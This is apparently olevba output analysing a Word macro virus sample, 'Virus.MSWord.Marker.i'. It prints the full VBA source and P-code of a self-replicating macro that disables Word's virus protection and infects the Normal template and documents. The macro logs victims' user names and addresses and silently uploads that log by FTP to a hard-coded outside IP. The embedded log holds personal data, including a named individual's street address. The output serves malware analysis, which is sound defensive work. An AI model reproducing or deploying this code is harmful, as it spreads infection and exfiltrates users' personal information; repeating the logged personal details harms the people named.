olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.i
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.i - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub CheckBox1_Click()
Regularly scheduled meetings

End Sub

Private Sub Document_Close()

On Error Resume Next

Const Marker = "<- this is another marker!"

'Declare Variables
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim ad, nt As Object
Dim OurCode, UserAddress, LogData, LogUploaded As String

'Initialize Variables
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

DocumentInfected = ad.CodeModule.Find(Marker, 1, 1, 10000, 10000)
NormalTemplateInfected = nt.CodeModule.Find(Marker, 1, 1, 10000, 10000)


'Switch the VirusProtection OFF
Options.VirusProtection = False


  If (Day(Now()) = 1) And (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogUploaded") = False) Then
  
    If DocumentInfected = True Then
      LogData = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
    ElseIf NormalTemplateInfected = True Then
      LogData = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
    End If
    
    LogData = Mid(LogData, InStr(1, LogData, "' Log" & "file -->"), Len(LogData) - InStr(1, LogData, "' Log" & "file -->"))
    
    Randomize
    
    For i = 1 To 4
      LogFile = LogFile + Mid(Str(Int(8 * Rnd)), 2, 1)
    Next i
    LogFile = "C:\hsfx" & LogFile & ".sys"
    
    Open LogFile For Output As #1
    Print #1, LogData
    Close #1
    
    Open "c:\netldx.vxd" For Output As #1
    Print #1, "o 209.201.88.110"
    Print #1, "user anonymous"
    Print #1, "pass itsme@"
    Print #1, "cd incoming"
    Print #1, "ascii"
    Print #1, "put " & LogFile
    Print #1, "quit"
    Close #1
    
    Shell "command.com /c ftp.exe -n -s:c:\netldx.vxd", vbHide
    
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogUploaded") = True
  ElseIf Day(Now()) <> 1 Then
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogUploaded") = False
  End If


'Make sure that some conditions are true before we continue infecting anything
If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
  'Infect the NormalTemplate
  If DocumentInfected = True Then
  
    SaveNormalTemplate = NormalTemplate.Saved
  
    OurCode = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)

    
    'Write a log file of this NormalTemplate infection
    For i = 1 To Len(Application.UserAddress)
      If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
        If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
          UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
        End If
      Else
        UserAddress = UserAddress & Chr(13) & "' "
      End If
    Next i

    OurCode = OurCode & Chr(13) & _
              "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                     Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
              "' " & Application.UserName & Chr(13) & _
              "' " & UserAddress & Chr(13)


    nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
    nt.CodeModule.AddFromString OurCode
    
    If SaveNormalTemplate = True Then NormalTemplate.Save
    
  End If


  'Infect the ActiveDocument
  If NormalTemplateInfected = True And _
     (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
     ActiveDocument.Saved = False) Then
  
    SaveDocument = ActiveDocument.Saved
    
    OurCode = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)

    ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
    ad.CodeModule.AddFromString OurCode
    
    If SaveDocument = True Then ActiveDocument.Save
      
  End If
  
    
End If

End Sub

' Logfile -->

' 10:19:17  - Freitag, 11 Dez 1998
' SPo0Ky
' Blue Planet
'



' 10:50:20  - Tuesday, 5 Jan 1999
' Queensland TAFE
'



' 04:38:36  - Wednesday, 3 Feb 1999
' Lisa Macbeth
'



' 03:39:47  - Monday, 8 Feb 1999
' DTIR
'



' 01:56:06  - Friday, 12 Feb 1999
' Clare Keating
' Clare Keating
' 67 Carmel Street
' Bardon   Q  4065



' 08:27:56  - Tuesday, 16 Feb 1999
' SUPERVISOR
'



' 08:52:51 am - Friday, 19 Feb 1999
' sasawt
'



' 02:48:29  - Friday, 19 Feb 1999
' kzperk
'



' 11:40:51  - Wednesday, 24 Feb 1999
' azjard
'



' 10:32:45  - Friday, 26 Feb 1999
' dzolea
'



' 02:50:49 PM - Saturday, 20 Feb 1999
' elizg
'



' 08:33:17  - Monday, 15 Mar 1999
' dzolea
'



' 10:17:03  - Monday, 29 Mar 1999
' tzbenn
'



' 10:21:05  - Wednesday, 31 Mar 1999
' tzbenn
'



' 10:53:33  - Tuesday, 6 Apr 1999
' tzbenn
'



' 01:39:54 PM - Thursday, 8 Apr 1999
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)



' 04:13:53 PM - Friday, 7 May 1999
' Ditry PC
'



-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Marker.i
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 10256 bytes
' Line #0:
' 	FuncDefn (Private Sub CheckBox1_Click())
' Line #1:
' 	Reparse 0x001C "Regularly scheduled meetings"
' Line #2:
' Line #3:
' 	EndSub 
' Line #4:
' Line #5:
' 	FuncDefn (Private Sub Document_Close())
' Line #6:
' Line #7:
' 	OnError (Resume Next) 
' Line #8:
' Line #9:
' 	Dim (Const) 
' 	LitStr 0x001A "<- this is another marker!"
' 	VarDefn Marker
' Line #10:
' Line #11:
' 	QuoteRem 0x0000 0x0011 "Declare Variables"
' Line #12:
' 	Dim 
' 	VarDefn SaveDocument
' 	VarDefn SaveNormalTemplate
' 	VarDefn DocumentInfected
' 	VarDefn NormalTemplateInfected (As Boolean)
' Line #13:
' 	Dim 
' 	VarDefn ad
' 	VarDefn nt (As Object)
' Line #14:
' 	Dim 
' 	VarDefn OurCode
' 	VarDefn UserAddress
' 	VarDefn LogData
' 	VarDefn LogUploaded (As String)
' Line #15:
' Line #16:
' 	QuoteRem 0x0000 0x0014 "Initialize Variables"
' Line #17:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ad 
' Line #18:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set nt 
' Line #19:
' Line #20:
' 	Ld Marker 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St DocumentInfected 
' Line #21:
' 	Ld Marker 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St NormalTemplateInfected 
' Line #22:
' Line #23:
' Line #24:
' 	QuoteRem 0x0000 0x001E "Switch the VirusProtection OFF"
' Line #25:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #26:
' Line #27:
' Line #28:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x000B "LogUploaded"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #29:
' Line #30:
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #31:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St LogData 
' Line #32:
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	ElseIfBlock 
' Line #33:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St LogData 
' Line #34:
' 	EndIfBlock 
' Line #35:
' Line #36:
' 	Ld LogData 
' 	LitDI2 0x0001 
' 	Ld LogData 
' 	LitStr 0x0005 "' Log"
' 	LitStr 0x0008 "file -->"
' 	Concat 
' 	FnInStr3 
' 	Ld LogData 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Ld LogData 
' 	LitStr 0x0005 "' Log"
' 	LitStr 0x0008 "file -->"
' 	Concat 
' 	FnInStr3 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	St LogData 
' Line #37:
' Line #38:
' 	ArgsCall Read 0x0000 
' Line #39:
' Line #40:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	For 
' Line #41:
' 	Ld LogFile 
' 	LitDI2 0x0008 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	ArgsLd Str 0x0001 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St LogFile 
' Line #42:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #43:
' 	LitStr 0x0007 "C:\hsfx"
' 	Ld LogFile 
' 	Concat 
' 	LitStr 0x0004 ".sys"
' 	Concat 
' 	St LogFile 
' Line #44:
' Line #45:
' 	Ld LogFile 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #46:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld LogData 
' 	PrintItemNL 
' Line #47:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #48:
' Line #49:
' 	LitStr 0x000D "c:\netldx.vxd"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #50:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "o 209.201.88.110"
' 	PrintItemNL 
' Line #51:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "user anonymous"
' 	PrintItemNL 
' Line #52:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "pass itsme@"
' 	PrintItemNL 
' Line #53:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "cd incoming"
' 	PrintItemNL 
' Line #54:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "ascii"
' 	PrintItemNL 
' Line #55:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "put "
' 	Ld LogFile 
' 	Concat 
' 	PrintItemNL 
' Line #56:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "quit"
' 	PrintItemNL 
' Line #57:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #58:
' Line #59:
' 	LitStr 0x002A "command.com /c ftp.exe -n -s:c:\netldx.vxd"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #60:
' Line #61:
' 	LitVarSpecial (True)
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x000B "LogUploaded"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #62:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Ne 
' 	ElseIfBlock 
' Line #63:
' 	LitVarSpecial (False)
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x000B "LogUploaded"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #64:
' 	EndIfBlock 
' Line #65:
' Line #66:
' Line #67:
' 	QuoteRem 0x0000 0x004D "Make sure that some conditions are true before we continue infecting anything"
' Line #68:
' 	LineCont 0x0008 0B 00 03 00 12 00 03 00
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Xor 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #69:
' Line #70:
' Line #71:
' 	QuoteRem 0x0002 0x0019 "Infect the NormalTemplate"
' Line #72:
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #73:
' Line #74:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St SaveNormalTemplate 
' Line #75:
' Line #76:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St OurCode 
' Line #77:
' Line #78:
' Line #79:
' 	QuoteRem 0x0004 0x0031 "Write a log file of this NormalTemplate infection"
' Line #80:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd UserAddress 
' 	FnLen 
' 	For 
' Line #81:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	IfBlock 
' Line #82:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	IfBlock 
' Line #83:
' 	Ld UserAddress 
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St UserAddress 
' Line #84:
' 	EndIfBlock 
' Line #85:
' 	ElseBlock 
' Line #86:
' 	Ld UserAddress 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	St UserAddress 
' Line #87:
' 	EndIfBlock 
' Line #88:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #89:
' Line #90:
' 	LineCont 0x0010 09 00 0E 00 12 00 15 00 1E 00 0E 00 29 00 0E 00
' 	Ld OurCode 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Time 
' 	LitStr 0x0010 "hh:mm:ss AMPM - "
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	Ld Date 
' 	LitStr 0x0010 "dddd, d mmm yyyy"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld UserAddress 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St OurCode 
' Line #91:
' Line #92:
' Line #93:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #94:
' 	Ld OurCode 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #95:
' Line #96:
' 	Ld SaveNormalTemplate 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #97:
' Line #98:
' 	EndIfBlock 
' Line #99:
' Line #100:
' Line #101:
' 	QuoteRem 0x0002 0x0019 "Infect the ActiveDocument"
' Line #102:
' 	LineCont 0x0008 05 00 05 00 13 00 05 00
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 ":"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #103:
' Line #104:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St SaveDocument 
' Line #105:
' Line #106:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St OurCode 
' Line #107:
' Line #108:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #109:
' 	Ld OurCode 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #110:
' Line #111:
' 	Ld SaveDocument 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #112:
' Line #113:
' 	EndIfBlock 
' Line #114:
' Line #115:
' Line #116:
' 	EndIfBlock 
' Line #117:
' Line #118:
' 	EndSub 
' Line #119:
' Line #120:
' 	QuoteRem 0x0000 0x000C " Logfile -->"
' Line #121:
' Line #122:
' 	QuoteRem 0x0000 0x0021 " 10:19:17  - Freitag, 11 Dez 1998"
' Line #123:
' 	QuoteRem 0x0000 0x0007 " SPo0Ky"
' Line #124:
' 	QuoteRem 0x0000 0x000C " Blue Planet"
' Line #125:
' 	QuoteRem 0x0000 0x0000 ""
' Line #126:
' Line #127:
' Line #128:
' Line #129:
' 	QuoteRem 0x0000 0x0020 " 10:50:20  - Tuesday, 5 Jan 1999"
' Line #130:
' 	QuoteRem 0x0000 0x0010 " Queensland TAFE"
' Line #131:
' 	QuoteRem 0x0000 0x0000 ""
' Line #132:
' Line #133:
' Line #134:
' Line #135:
' 	QuoteRem 0x0000 0x0022 " 04:38:36  - Wednesday, 3 Feb 1999"
' Line #136:
' 	QuoteRem 0x0000 0x000D " Lisa Macbeth"
' Line #137:
' 	QuoteRem 0x0000 0x0000 ""
' Line #138:
' Line #139:
' Line #140:
' Line #141:
' 	QuoteRem 0x0000 0x001F " 03:39:47  - Monday, 8 Feb 1999"
' Line #142:
' 	QuoteRem 0x0000 0x0005 " DTIR"
' Line #143:
' 	QuoteRem 0x0000 0x0000 ""
' Line #144:
' Line #145:
' Line #146:
' Line #147:
' 	QuoteRem 0x0000 0x0020 " 01:56:06  - Friday, 12 Feb 1999"
' Line #148:
' 	QuoteRem 0x0000 0x000E " Clare Keating"
' Line #149:
' 	QuoteRem 0x0000 0x000E " Clare Keating"
' Line #150:
' 	QuoteRem 0x0000 0x0011 " 67 Carmel Street"
' Line #151:
' 	QuoteRem 0x0000 0x0011 " Bardon   Q  4065"
' Line #152:
' Line #153:
' Line #154:
' Line #155:
' 	QuoteRem 0x0000 0x0021 " 08:27:56  - Tuesday, 16 Feb 1999"
' Line #156:
' 	QuoteRem 0x0000 0x000B " SUPERVISOR"
' Line #157:
' 	QuoteRem 0x0000 0x0000 ""
' Line #158:
' Line #159:
' Line #160:
' Line #161:
' 	QuoteRem 0x0000 0x0022 " 08:52:51 am - Friday, 19 Feb 1999"
' Line #162:
' 	QuoteRem 0x0000 0x0007 " sasawt"
' Line #163:
' 	QuoteRem 0x0000 0x0000 ""
' Line #164:
' Line #165:
' Line #166:
' Line #167:
' 	QuoteRem 0x0000 0x0020 " 02:48:29  - Friday, 19 Feb 1999"
' Line #168:
' 	QuoteRem 0x0000 0x0007 " kzperk"
' Line #169:
' 	QuoteRem 0x0000 0x0000 ""
' Line #170:
' Line #171:
' Line #172:
' Line #173:
' 	QuoteRem 0x0000 0x0023 " 11:40:51  - Wednesday, 24 Feb 1999"
' Line #174:
' 	QuoteRem 0x0000 0x0007 " azjard"
' Line #175:
' 	QuoteRem 0x0000 0x0000 ""
' Line #176:
' Line #177:
' Line #178:
' Line #179:
' 	QuoteRem 0x0000 0x0020 " 10:32:45  - Friday, 26 Feb 1999"
' Line #180:
' 	QuoteRem 0x0000 0x0007 " dzolea"
' Line #181:
' 	QuoteRem 0x0000 0x0000 ""
' Line #182:
' Line #183:
' Line #184:
' Line #185:
' 	QuoteRem 0x0000 0x0024 " 02:50:49 PM - Saturday, 20 Feb 1999"
' Line #186:
' 	QuoteRem 0x0000 0x0006 " elizg"
' Line #187:
' 	QuoteRem 0x0000 0x0000 ""
' Line #188:
' Line #189:
' Line #190:
' Line #191:
' 	QuoteRem 0x0000 0x0020 " 08:33:17  - Monday, 15 Mar 1999"
' Line #192:
' 	QuoteRem 0x0000 0x0007 " dzolea"
' Line #193:
' 	QuoteRem 0x0000 0x0000 ""
' Line #194:
' Line #195:
' Line #196:
' Line #197:
' 	QuoteRem 0x0000 0x0020 " 10:17:03  - Monday, 29 Mar 1999"
' Line #198:
' 	QuoteRem 0x0000 0x0007 " tzbenn"
' Line #199:
' 	QuoteRem 0x0000 0x0000 ""
' Line #200:
' Line #201:
' Line #202:
' Line #203:
' 	QuoteRem 0x0000 0x0023 " 10:21:05  - Wednesday, 31 Mar 1999"
' Line #204:
' 	QuoteRem 0x0000 0x0007 " tzbenn"
' Line #205:
' 	QuoteRem 0x0000 0x0000 ""
' Line #206:
' Line #207:
' Line #208:
' Line #209:
' 	QuoteRem 0x0000 0x0020 " 10:53:33  - Tuesday, 6 Apr 1999"
' Line #210:
' 	QuoteRem 0x0000 0x0007 " tzbenn"
' Line #211:
' 	QuoteRem 0x0000 0x0000 ""
' Line #212:
' Line #213:
' Line #214:
' Line #215:
' 	QuoteRem 0x0000 0x0023 " 01:39:54 PM - Thursday, 8 Apr 1999"
' Line #216:
' 	QuoteRem 0x0000 0x0008 " OPEY A."
' Line #217:
' 	QuoteRem 0x0000 0x001E " CNNHS B'92 PHILIPPINES (CNSC)"
' Line #218:
' Line #219:
' Line #220:
' Line #221:
' 	QuoteRem 0x0000 0x0021 " 04:13:53 PM - Friday, 7 May 1999"
' Line #222:
' 	QuoteRem 0x0000 0x0009 " Ditry PC"
' Line #223:
' 	QuoteRem 0x0000 0x0000 ""
' Line #224:
' Line #225:
' Line #226:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |CheckBox1_Click     |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |209.201.88.110      |IPv4 address                                 |
|IOC       |ftp.exe             |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

